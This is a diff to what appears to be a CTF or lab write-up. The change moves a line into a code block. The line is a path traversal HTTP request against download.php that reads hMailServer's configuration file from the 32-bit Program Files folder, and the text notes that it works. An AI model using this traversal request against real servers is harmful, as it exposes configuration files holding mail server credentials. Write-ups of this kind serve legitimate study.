@@ -148,8 +148,10 @@ GET /download.php?file=..\..\Program+Files\hmailServer\Bin\hMailServer.ini HTTP/
 ````
 <img width="1598" height="752" alt="image" src="https://github.com/user-attachments/assets/bd747d67-96c0-43ab-a9c1-738d5ae2aa65" />
 
-Does not work, maybe hmailserver waws installed as 32 bit, try this: GET /download.php?file=..\..\Program+Files+(x86)\hmailServer\Bin\hMailServer.ini HTTP/1.1
-
+Does not work, maybe hmailserver waws installed as 32 bit, try this:
+````
+GET /download.php?file=..\..\Program+Files+(x86)\hmailServer\Bin\hMailServer.ini HTTP/1.1
+````
 This works plenty: <img width="1597" height="755" alt="image" src="https://github.com/user-attachments/assets/5e766160-b8a7-4df8-8847-914df55bb6ff" />
 
 ```bash
